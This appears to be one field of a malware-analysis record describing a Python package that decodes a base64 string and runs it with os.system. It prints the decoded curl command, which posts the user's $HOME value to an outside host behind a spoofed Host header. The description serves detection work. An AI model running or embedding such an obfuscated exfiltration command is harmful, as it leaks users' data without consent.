      "malicious_behavior": "The code contains a base64-encoded string that, when decoded, forms a shell command executed immediately via os.system. The decoded command is: curl -k -X POST \"https://pypi.org\" -H \"Host: psec.forward.io.global.prod.fastly.net\" -d \"test=$HOME\". This command silently sends an HTTP POST request to a suspicious host (psec.forward.io.global.prod.fastly.net) with the environment variable $HOME included in the POST data, effectively exfiltrating user environment information without user consent or notification. The use of base64 encoding to hide the command, immediate execution without validation or user interaction, and the exfiltration of environment data to a non-standard, suspicious domain are strong indicators of malicious intent. This pattern matches known malware behaviors involving obfuscated command execution and data exfiltration."
